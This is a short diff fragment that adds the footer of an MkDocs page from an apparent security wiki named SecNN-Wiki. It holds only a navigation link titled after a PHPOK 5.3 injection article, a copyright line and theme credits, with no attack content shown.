+        Previous</a><a href="../PHPOK%205.3%20%E5%89%8D%E5%8F%B0%E6%97%A0%E9%99%90%E5%88%B6%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        PHPOK 5.3 前台无限制注入
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
